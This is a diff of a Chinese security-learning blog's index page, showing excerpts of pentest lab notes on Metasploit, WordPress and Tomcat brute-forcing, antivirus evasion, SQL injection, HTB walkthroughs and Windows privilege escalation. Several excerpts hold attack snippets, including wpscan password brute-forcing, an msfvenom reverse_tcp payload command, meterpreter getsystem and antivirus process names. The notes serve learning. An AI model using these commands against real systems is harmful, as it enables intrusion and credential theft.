@@ -54,7 +54,7 @@
   isHome: true,
   isHighlightShrink: false,
   isToc: false,
-  postUpdate: '2023-10-09 16:05:59'
+  postUpdate: '2023-11-18 17:23:00'
 }</script><noscript><style type="text/css">
   #nav {
     opacity: 1
@@ -158,208 +158,160 @@
       }
     }
     detectApple()
-    })(window)</script><meta name="generator" content="Hexo 5.4.2"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/touxiang.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">32</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">28</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Enderman_1's blog"><span class="site-name">Enderman_1's blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">Enderman_1's blog</h1></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2023/10/09/%E5%B0%8F%E5%AF%84%E5%B7%A7/python%20flask%E6%A1%86%E6%9E%B6/" title="Python flask框架">Python flask框架</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-10-09T07:48:08.314Z" title="发表于 2023-10-09 15:48:08">2023-10-09</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E5%B0%8F%E5%AF%84%E5%B7%A7/">小寄巧</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/%E5%B0%8F%E5%AF%84%E5%B7%A7/Python/">Python</a></span></div><div class="content">python flask框架（SSTI模板注入前置知识）什么是flaskflask是一个采用python语言编写的web框架
-WSGI工具箱采用Werkzeug，模板引擎使用Jinjia2。
-python虚拟环境搭建
-需要venv（python的虚拟环境）
-
-创建venv环境安装flask
-1apt install python3-venv
-
-在opt目录下创建虚拟环境运行flask
-12cd /optpython3 -m venv flask1
+    })(window)</script><meta name="generator" content="Hexo 5.4.2"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/touxiang.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">50</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">39</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div></div></div><div class="page" id="body-wrap"><header class="full_page" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Enderman_1's blog"><span class="site-name">Enderman_1's blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="site-info"><h1 id="site-title">Enderman_1's blog</h1></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2023/11/18/%E5%B0%8F%E5%AF%84%E5%B7%A7/windows%E6%8F%90%E6%9D%83/" title="windows提权">windows提权</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-11-18T09:12:37.226Z" title="发表于 2023-11-18 17:12:37">2023-11-18</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E5%B0%8F%E5%AF%84%E5%B7%A7/">小寄巧</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/%E5%B0%8F%E5%AF%84%E5%B7%A7/windows/">windows</a></span></div><div class="content">windows提权参考原文链接：https://zhuanlan.zhihu.com/p/394060852
+信息收集常规信息收集12345678910systeminfo #查询系统信息hostname #主机名net user #查看用户信息netstat -and|find &quot;3389&quot; # 查看服务pid号wmic os get caption #查看系统名wmic qfe get Description,HotFixID,InstalledOn134 #查看补丁信息wmic product get name,version #查看当前安装程序wmic service list brief #查询本机进程net share #查看本机共享列表netsh firewall show config #查看防火墙配置
 
 
 
-如何运行真实环境和虚拟环境下的.py文件
-真实环境：
-1python3 demo.py
+常见的杀软如下
 
-虚拟环境：
-方法一
-1/opt/flask1/bin/python3 demo.py
+360sd.exe 360杀毒
+360tray.exe 360实时防护
+ZhuDongFangYu.exe 360主动防御
+KSafeTray.exe 金山卫士
+SafeDogUpdateCenter.exe 安全狗
+McAf ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2023/11/18/%E5%B0%8F%E5%AF%84%E5%B7%A7/windows%E5%91%BD%E4%BB%A4%E8%A1%8C%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90/" title="widows命令行开启管理员权限">widows命令行开启管理员权限</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-11-18T09:12:37.222Z" title="发表于 2023-11-18 17:12:37">2023-11-18</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E5%B0%8F%E5%AF%84%E5%B7%A7/">小寄巧</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/%E5%B0%8F%E5%AF%84%E5%B7%A7/windows/">windows</a></span></div><div class="content">开启禁用的管理员账号1net user administrator /active:yes
 
-方法二（激活虚拟环境）（退出虚拟环境的命令是：deactivate）
-123cd flask1source ./bin/activatepython3 demo.py
+(可以输入 net user /? 来查看命令的使用方法)
+使用管理员权限运行程序1runas /user:administrator cmd #这里跟的是命令</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2023/11/18/%E5%B0%8F%E5%AF%84%E5%B7%A7/windows%E5%90%8E%E6%B8%97%E9%80%8F/" title="windows后渗透">windows后渗透</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-11-18T09:12:37.219Z" title="发表于 2023-11-18 17:12:37">2023-11-18</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E5%B0%8F%E5%AF%84%E5%B7%A7/">小寄巧</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/%E5%B0%8F%E5%AF%84%E5%B7%A7/windows/">windows</a></span></div><div class="content">windows后渗透修改注册表1regedit
 
-安装flask框架在虚拟环境下安装flask框架
-123cd /opt/flask1source ./bin/activatepip install flask
-
-
-
-测试是否安装成功
-123p ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2023/09/15/htb%E9%9D%B6%E6%9C%BA%E8%AE%B0%E5%BD%95/4%EF%BC%89responder/" title="htb - responder">htb - responder</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-09-15T06:48:13.943Z" title="发表于 2023-09-15 14:48:13">2023-09-15</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/hack-the-box/">hack the box</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/hack-the-box/htb-responder/">htb - responder</a></span></div><div class="content">htb - responder
-htb walkthrough原文：
-本实验的重点是如何利用Windows机器上的网页上的文件包含漏洞来收集正在运行web服务器的用户的NetNTLMv2挑战。我们将使用一个名为Responder的实用程序来捕获NetNTLMv2散列，然后使用一个名为john the ripper的实用程序测试数以百万计的潜在密码，看看它们是否与用于创建散列的密码匹配。我们还将深入研究NTLM身份验证的工作过程，以及Responder实用程序如何捕获挑战。我们认为，理解工具或框架的底层工作原理是至关重要的，因为它加强了人们理解的基础，这有助于人们在现实世界中可能面临的利用场景，这些场景乍一看并不容易受到攻击。让我们直奔主题。
-
-攻击流程及思路扫描靶机开放端口和相应的服务1nmap -p- --min-rate 1000 -sV 10.129.58.87
+reg常用命令增加1reg add hkcu\charles /v hello /t REG_SZ /d &quot;welcome to lgch_xyz&quot;
 
 
-根据Nmap扫描的结果，该机器正在使用Windows作为其操作系统。检测到两个端口打开，其中Apache web服务器在端口80上运行，WinRM在端口5985上运行。
+HKCU：根键 HKEY_CURRENT_USER的缩写另外几个缩写：HKCR、HKLM、HKU、HKCC，取根键的/v：需要创建的值的名称/t：值的类型/d：值的数据
+此命令的执行结果：
 
 
-Windows远程管理(WinRM)是Wi ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2023/07/26/%E5%AE%89%E5%85%A8%E5%85%8D%E6%9D%80/msf%E6%B8%97%E9%80%8Fwordpress/" title="msf渗透wordpress博客">msf渗透wordpress博客</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-07-26T06:48:11.303Z" title="发表于 2023-07-26 14:48:11">2023-07-26</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF/">免杀技术</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF/msf%E5%AE%9E%E8%B7%B5%E6%A1%88%E4%BE%8B/">msf实践案例</a></span></div><div class="content">msf渗透wordpress博客
-WordPress是一款能帮助建立网站、博客或应用程序的开源软件。
-
-此类软件可能存在漏洞的地方
-程序本身
-插件
-主题 theme
-
-使用wpscan爆破用户名和密码进行登录扫描用户名1wpscan --url http://192.168.3.7:8081/wordpress --enumerate u
+注册表上的“默认”值如何修改1reg add hkcu\charles /ve /t REG_DWORD /d 1
 
 
-这里找到一个用户：admin
+默认值的名称默认写作“/ve”
+ve = value empty
 
-利用密码字典暴力破解密码1wpscan --url http://192.168.3.7:8081/wordpress -U admin -P /root/pw.txt
+导入导出删除导出hkcu\charles这个键到桌面下命名为charles.reg
+1reg export hkcu\charles c:\Users\lkk-win7\Desktop\charles.reg
 
+删除hkcu键，稍后用导出的注册表恢复文件
+1reg delete hkcu\charles /f
 
-成功，用户admin的密码为123456，可以登录并进入网站的后台了
-由于此时仍处于web端，下一步的目的是去到服务器的操作系统执行命令
-下一步：文件上传，反弹shell
+此时查看这个键会报错
+1reg query hkcu\charles
 
-思路一、 正向连接，找上传点，上传一句话木马
-然而正向连接往往有局限性：
+导入
+1 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2023/11/18/%E5%B0%8F%E5%AF%84%E5%B7%A7/tmux%20%E5%BF%AB%E6%8D%B7%E6%8C%87%E4%BB%A4/" title="tmux终端复用">tmux终端复用</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-11-18T09:12:37.209Z" title="发表于 2023-11-18 17:12:37">2023-11-18</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E5%B0%8F%E5%AF%84%E5%B7%A7/">小寄巧</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/%E5%B0%8F%E5%AF%84%E5%B7%A7/tmux/">tmux</a></span></div><div class="content">放大缩小终端字体
+ctrl  + shift + + ——放大
+ctrl  +  -             ——缩小
 
-目标机器开了防火墙（入的端口关闭，出的端口打开）
-目标机器是内网机器，没有公网ip（攻击机不能访问，而目标机器可以访问其他机器）
-目标机器IP是动态变化的
+tmux使用（终端复用）ctrl + b是快捷键的启动命令，按下这两个键后，后续的一个命令才对tmux生效
+shift + “上下拆分
 
-以上三种情况都不适用于正向连接
-思路二、 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2023/07/26/%E5%AE%89%E5%85%A8%E5%85%8D%E6%9D%80/msf%E7%88%86%E7%A0%B4tomcat/" title="msf爆破tomcat">msf爆破tomcat</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-07-26T06:48:11.297Z" title="发表于 2023-07-26 14:48:11">2023-07-26</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF/">免杀技术</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF/msf%E5%AE%9E%E8%B7%B5%E6%A1%88%E4%BE%8B/">msf实践案例</a></span></div><div class="content">msf爆破tomcat
-Tomcat是一款Apache下面的开源的Servlet容器，实现了对Servlet和JSP规范的支持。另外 Tomcat 本身内含了一个 HTTP 服务器，所以也可以被当作一个 Web 服务器来使用。但是Tomcat作为一个Web服务器，它对静态资源的处理能力要比Apache或者Nginx这类的Web服务器差很多，所以我们经常将Apache和Tomcat（或者是Nginx和Tomcat）组合使用，Apache来充当Web服务器处理静态资源的请求，Tomcat充当Servlet容器来处理动态请求。
-
-
-Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。
-
-步骤
-找到后台管理界面
-使用 auxiliary/scanner/http/tomcat_mgr_login 模块爆破后台密码
-利用msf毒液制作java木马: msfvenom -p java/meterpreter/reverse_tcp lhost=x.x.x.x lport=x -f ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2023/07/12/%E5%AE%89%E5%85%A8%E5%85%8D%E6%9D%80/msf%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80/" title="msf工具基础">msf工具基础</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-07-12T10:06:23.677Z" title="发表于 2023-07-12 18:06:23">2023-07-12</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF/">免杀技术</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF/msf%E5%B7%A5%E5%85%B7%E5%9F%BA%E7%A1%80/">msf工具基础</a></span></div><div class="content">MSF工具
-msf：metasploit（MSF）是一个免费的、可下载的框架，通过它可以很容易地获取、开发并对计算机软件漏洞实施攻击。
-
-它本身附带数百个已知软件漏洞，是一款专业级漏洞攻击工具
-一般kali里面就集成了msf工具，安装了kali就会带有它
-我打算通过借助msf工具来初步学习免杀
-msf自带的核心模块
-exploit 利用模块
-payload 攻击载荷模块
-auxiliary 辅助模块
-post 后渗透模块
-encoders 编码模块
-evasion 免杀模块
-nops 空模块
-
-kali 下msf常用模块所在目录
-kali 下msf默认安装目录    /usr/share/metasploit-framework
-模块所在目录    /usr/share/metasploit-framework/modules
-​    例如exploits模块所在目录    /usr/share/metasploit-framework/modules/exploits
-
-每个模块对应的文件都能在对应的目录下找到
-exploits利用模块
-active exploit 直接攻击，适用 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2023/07/12/%E5%AE%89%E5%85%A8%E5%85%8D%E6%9D%80/msf%E6%A8%A1%E5%9D%97%E4%BD%BF%E7%94%A8/" title="msf模块使用">msf模块使用</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-07-12T10:06:23.671Z" title="发表于 2023-07-12 18:06:23">2023-07-12</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF/">免杀技术</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF/msf%E6%A8%A1%E5%9D%97%E4%BD%BF%E7%94%A8/">msf模块使用</a></span></div><div class="content">msf模块使用主机发现所使用的模块msf下用于做主机发现的模块：auxiliary/scanner/discovery/arp_sweep
-使用方法设置ip网段，run
-例：
-查看当前参数： show options
-
-设置ip网段： set RHOSTS 192.168.3.1/24
-
-润！：run（线程数太少会很慢，先设置成50最好）
-
-端口扫描所使用的模块（这里扫描tcp）auxiliary/scanner/portscan/tcp 
-使用方法show option查看待设置的参数（待扫描的ip），设置好就能润了
-
-目录扫描所使用模块auxiliary/scanner/http/dir_scanner
-使用方法
-设置待扫描主机ip
-设置默认端口号
-设置线程数
-润
+shift + % 左右拆分
 
 
-原理将默认字典里的常用字段（如bank、code）拼接到根目录url的后面，并逐个进行访问，访问成功则说明有这个目录。
-在实际使用过程中可以修改所使用的字典达到更好的扫描效果。
-总结msf模块使用通用流程：
 
-search 命令查找要使用的模块
-use 命令使用这个模块
-show options 命令查看这个模块待设 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2023/07/09/%E5%AE%89%E5%85%A8%E5%85%8D%E6%9D%80/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80/" title="免杀基础">免杀基础</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-07-09T14:19:08.954Z" title="发表于 2023-07-09 22:19:08">2023-07-09</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF/">免杀技术</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/%E5%85%8D%E6%9D%80%E6%8A%80%E6%9C%AF/%E5%85%8D%E6%9D%80%E5%9F%BA%E7%A1%80/">免杀基础</a></span></div><div class="content">免杀基础免杀的概念
-免杀，也就是反病毒(AntiVirus)与反间谍(AntiSpyware)的对立面，英文为Anti-AntiVirus（简写Virus AV），逐字翻译为“反-反病毒”，翻译为“反杀毒技术”。 也就是我们常说的bypass AV
-
-杀毒软件分类免费版360安全卫士、火绒、电脑管家等等
-收费版也称为企业版（EDR）。对比免费版，企业版的查杀更为严格，特别是针对内存的查杀，比如：卡巴斯基、ESET(NOD32)等等
-杀软检测的方式扫描技术
-扫描压缩包，对压缩包文件进行分析检查
-程序防篡改，避免程序或文件被恶意程序篡改
-修复技术，对恶意程序所破坏的文件进行还原
-智能扫描，扫描常用磁盘，系统关键位置，时间短
-全盘扫描，扫描电脑全盘文件，时间长
-勒索软件防护，保护电脑不受勒索软件的攻击
-开机扫描，电脑开机时自动扫描，可以扫描压缩文档和不需要的程序
-
-监控技术
-内存监控，监控内存中的数据，监控所有进程，当发现内存中存在病毒的时候，就会主动报警
-文件监控，当发现写到磁盘上的文件中存在病毒，或者是被病毒感染，就会主动报警
-邮件监控，当发现邮件的附件存在病毒时进行拦截
-网页防护，阻止 ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2023/06/07/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/" title="业务逻辑漏洞基础">业务逻辑漏洞基础</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-06-06T16:39:09.220Z" title="发表于 2023-06-07 00:39:09">2023-06-07</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80/">网安基础</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91/">业务逻辑</a></span></div><div class="content">业务逻辑漏洞基础定义
-业务逻辑漏洞是应用程序的设计和实现中的缺陷，攻击者可以利用这些缺陷引发意外行为。
-
-以相对合法的方式达到目的
-如利用业务的充值bug刷数额
-</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2023/06/07/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/%E4%BA%A4%E6%8D%A2%E6%9C%BA/" title="无题">无题</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-06-06T16:39:09.216Z" title="发表于 2023-06-07 00:39:09">2023-06-07</time></span></div><div class="content">交换机
-Ethernet 10Mb/s
-FastEthernet 100Mb/
-GigabitEthernet 1000Mb/s
-TenGigabitEthernet 10000Mb/s
-
-特殊接口
-console 接口： 用来初始化管理电脑的接口
-
-思科机器命名一般思科的交换机开头的数字就表明这台机器是工作在第几层的
-如：
-
-2960 — 这是一台工作在第二层的机器
-
-工作在第三层以上的机器才能配ip地址家用路由器家用路由器实际上是一种三层交换机，严格上算是交换机和路由器的杂交产品。
-家用路由器通常有五个端口，其中有一个连接外网。其余四个连接内网。
-这四个端口是二层端口
-</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2023/06/07/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E7%AC%94%E8%AE%B0/SQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/" title="SQL注入基础">SQL注入基础</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-06-06T16:39:09.174Z" title="发表于 2023-06-07 00:39:09">2023-06-07</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80/">网安基础</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80/SQL%E6%B3%A8%E5%85%A5/">SQL注入</a></span></div><div class="content">SQL注入基础概述一、 原理SQL注入原理：
-
-SQL注入利用了程序未能正确过滤、转义或验证用户输入的情况。攻击者通过在用户输入中插入恶意的SQL代码，改变原始查询的逻辑，从而实现对数据库的非法操作。
-
-二、 注入点注入点：
-
-注入点是指程序中的用户输入接收点，通常是网页表单、URL参数或其他用户可控的输入字段。攻击者会利用这些输入点，注入恶意代码来攻击数据库。
-
-三、分类
-基于错误的注入：
-
-攻击者通过构造恶意输入，使得SQL语句执行出错，从而获取错误信息，包括数据库结构、数据内容等敏感信息。
+alt + 方向键 调整窗口
+z 窗口最大化，还原 相互切换 （zoom）
 
 
-基于布尔盲注的注入：
+ctrl + b 然后随便按方向键可以把光标切到任意的一个窗口的位置
 
-攻击者通过构造恶意输入，利用SQL语句执行结果的布尔值（真或假）来推断出数据库中的信息，逐步获取数据。
-
-
-基于时间盲注的注入：
-
-攻击者通过构造恶意输入，利用SQL语句的执行时间来推断出数据库中的信息，例如通过延迟执行的SQL语句来判断条件是否满足。
+终端光标移动
+ctrl + a 移动到开头
+ctrl + e 移动到结尾
 
 
-基于联合查询的注入：
+alt + b 往左移动一个词（back
+alt + f  往右移动一个词（forward
 
-攻击者通过在注入点构造特殊的查询语句，利用UNION操作将额外的查询结果合并到原始查询结果中，从而获取额外的数据。
+</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2023/11/18/%E5%B0%8F%E5%AF%84%E5%B7%A7/Python%E6%A8%A1%E5%9D%97/" title="Python模块">Python模块</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-11-18T09:12:37.206Z" title="发表于 2023-11-18 17:12:37">2023-11-18</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E5%B0%8F%E5%AF%84%E5%B7%A7/">小寄巧</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/%E5%B0%8F%E5%AF%84%E5%B7%A7/Python/">Python</a></span></div><div class="content">Python 模块
+模块基本上就是一个 包含了所有你定义的函数和变量的文件。模块的文件名必须以. py为扩展名。
+
+sys模块1234567#!/usr/bin/python# Filename: using_sys.pyimport sysprint (&#x27;The command line arguments are:&#x27;)for i in sys.argv:	print (i)print (&#x27;\n\nThe PYTHONPATH is&#x27;, sys.path, &#x27;\n&#x27;) 
+
+输出结果：
+
+The command line arguments are:test.py
+The PYTHONPATH is [‘/home/lkk’, ‘/usr/lib/python38.zip’, ‘/usr/lib/python3.8’, ‘/usr/lib/python3.8/lib-dynload’, ‘/usr/local/lib/python3.8/dist-packages’, ‘/usr/lib/python3/dist-packag ...</div></div></div><div class="recent-post-item"><div class="recent-post-info no-cover"><a class="article-title" href="/2023/11/18/%E5%B0%8F%E5%AF%84%E5%B7%A7/meterpreter%E5%91%BD%E4%BB%A4/" title="meterpreter常用命令">meterpreter常用命令</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time datetime="2023-11-18T09:12:37.189Z" title="发表于 2023-11-18 17:12:37">2023-11-18</time></span><span class="article-meta"><span class="article-meta-separator">|</span><i class="fas fa-inbox"></i><a class="article-meta__categories" href="/categories/%E5%B0%8F%E5%AF%84%E5%B7%A7/">小寄巧</a><i class="fas fa-angle-right article-meta-link"></i><a class="article-meta__categories" href="/categories/%E5%B0%8F%E5%AF%84%E5%B7%A7/meterpreter/">meterpreter</a></span></div><div class="content">meterpreter命令获取system权限1getsystem
 
 
-基于堆叠查询的注入：
 
-攻击者通过在注入点构造多个SQL查询语句，并 ...</div></div></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span><a class="page-number" href="/page/2/#content-inner">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/#content-inner">4</a><a class="extend next" rel="next" href="/page/2/#content-inner"><i class="fas fa-chevron-right fa-fw"></i></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://endermanneer.oss-cn-guangzhou.aliyuncs.com/touxiang.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Enderman_1</div><div class="author-info__description">A fictional character not yet born...</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">32</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">28</div></a></div><a id="card-info-btn" target="_blank" 